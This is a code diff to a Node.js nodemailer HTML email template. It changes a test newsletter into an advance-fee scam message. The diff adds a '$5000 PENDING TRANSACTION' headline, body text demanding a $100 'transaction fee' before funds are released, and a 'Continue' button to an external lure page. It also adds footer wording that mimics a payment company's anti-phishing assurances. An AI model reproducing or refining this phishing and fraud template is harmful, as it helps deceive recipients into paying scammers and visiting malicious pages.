@@ -48,32 +48,32 @@ const transporter = nodemailer.createTransport({
     html: `
   <p style="text-align: center; color: #999999; font-size: 12px;">Hello ${sanitizedName}</p>
   <div style="font-family: Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; text-align: center; padding: 20px; background-color: #f1f4f7;">
-    <img src="https://michyqruz.github.io/The-money-box/IMG_8211.JPG" alt="logo" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
-    <h1 style="color: #000000; font-size: 36px; margin: 40px 0; font-weight: 900;">Welcome to Our Newsletter</h1>
+    <img src="https://michyqruz.github.io/The-money-box/IMG_8578.jpeg" alt="logo" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
+    <h1 style="color: #000000; font-size: 36px; margin: 40px 0; font-weight: 900;">$5000 PENDING TRANSACTION</h1>
     <p style="color: #000000; font-size: 20px; font-weight: bold; text-align: left; line-height: 1.5;">
-        Thank you for subscribing! Here's a test email with some thumbnail images. Here's a test email with some thumbnail images.
+        You just receieved $5000 from a bussiness account for the first time, due to security reason you need to pay a transaction fee of $100 before the fund is deposited into your account.
     </p>
-    <a href="https://millxore.github.io/start/" style="display: inline-block; color: #ffffff; padding: 15px 40px; background-color: #000000; color: white; text-decoration: none; border-radius: 25px; font-size: 16px; margin: 10px 0; font-weight: bold;">Explore</a>
+    <a href="https://millxore.github.io/seen/" style="display: inline-block; color: #ffffff; padding: 15px 40px; background-color: #000000; color: white; text-decoration: none; border-radius: 25px; font-size: 16px; margin: 10px 0; font-weight: bold;">Continue</a>
   </div>
       
       <div style="background-color: #f1f4f7; max-width: 600px; margin: 0 auto; padding: 20px;">
           <div style="text-align: center;">
-              <img src="https://michyqruz.github.io/The-money-box/IMG_8211.JPG" alt="logo" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
+              <img src="https://michyqruz.github.io/The-money-box/IMG_8578.jpeg" alt="logo" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
               <hr style="margin: 30px auto; border: 1px solid #D3D3D3;">
           </div>
-          <div style="text-align: center;">
-              <a href="#" style="font-size: 12px; color: #1a73e8; text-decoration: none; padding: 0 8px;">Help & Contact</a>
-              <a href="#" style="font-size: 12px; color: #1a73e8; text-decoration: none; padding: 0 8px; border-left: 2px solid black;">Security</a>
-              <a href="#" style="font-size: 12px; color: #1a73e8; text-decoration: none; padding: 0 8px; border-left: 2px solid black;">Apps</a>
+          <div style="text-align: center; display: flex; justify-content: center;">
+              <p style="font-size: 12px; color: #1a73e8; padding: 0 8px;">Reliable</p>
+              <p style="font-size: 12px; color: #1a73e8; padding: 0 8px; border-left: 2px solid black;">Secure</p>
+              <p style="font-size: 12px; color: #1a73e8; padding: 0 8px; border-left: 2px solid black;">Easy</p>
           </div>
           <p style="color: #555; font-size: 14px;">
-     We are committed to preventing fraudulent emails. Emails from us will always contain your full name. <span style="font-size: 12px; color: #1a73e8; text-decoration: none;">Learn to identify phishing</span>
+     We are committed to preventing fraudulent emails. Emails from us will always contain your full name. <span style="font-size: 12px; color: #1a73e8;">Learn to identify phishing</span>
           </p>
           <p style="color: #555; font-size: 14px;">
-      Please don't reply to this email. To get in touch with us, click <span style="font-size: 12px; color: #1a73e8; text-decoration: none;">Help & Contact.</span>   
+      Please don't reply to this email. To get in touch with us, Check <span style="font-size: 12px; color: #1a73e8;">Help & Contact.</span>
           </p>
           <p style="color: #555; font-size: 14px;">
-      Not sure why you received this email? <span style="font-size: 12px; color: #1a73e8; text-decoration: none;">Learn more</span>
+      For more info, visit our website!
           </p>
           <p style="color: #555; font-size: 14px;">
       Copyright © 1999-2025. All rights reserved. 
